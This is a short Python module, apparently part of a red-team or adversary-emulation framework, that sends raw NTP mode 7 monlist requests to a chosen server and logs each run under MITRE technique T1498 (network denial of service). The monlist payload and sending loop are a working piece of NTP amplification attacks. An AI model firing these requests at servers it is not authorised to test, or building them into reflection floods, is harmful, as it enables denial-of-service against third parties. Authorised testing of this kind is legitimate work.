# modules/exploits/ntp_amplification_launcher.py

import argparse
import socket
import struct
import time
import json
import os
from datetime import datetime

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T1498"  # Network Denial of Service

NTP_MONLIST_PAYLOAD = b'\x17\x00\x03\x2a' + b'\x00' * 4  # Mode 7 request for monlist

def log_event(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH) as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def send_ntp_request(target, port=123, count=5, delay=1.0):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for i in range(count):
        try:
            sock.sendto(NTP_MONLIST_PAYLOAD, (target, port))
            print(f"[âœ“] Sent monlist request to {target}:{port} ({i+1}/{count})")
            time.sleep(delay)
        except Exception as e:
            print(f"[!] Failed to send: {e}")
    sock.close()

    log_event({
        "timestamp": datetime.utcnow().isoformat(),
        "target": target,
        "port": port,
        "payload_type": "ntp-monlist",
        "count": count,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="NTP Amplification Probe Launcher")
    parser.add_argument("--target", required=True, help="Target NTP server IP")
    parser.add_argument("--port", type=int, default=123, help="NTP UDP port")
    parser.add_argument("--count", type=int, default=5, help="Number of probes")
    parser.add_argument("--delay", type=float, default=1.0, help="Delay between sends")
    args = parser.parse_args()

    send_ntp_request(args.target, args.port, args.count, args.delay)
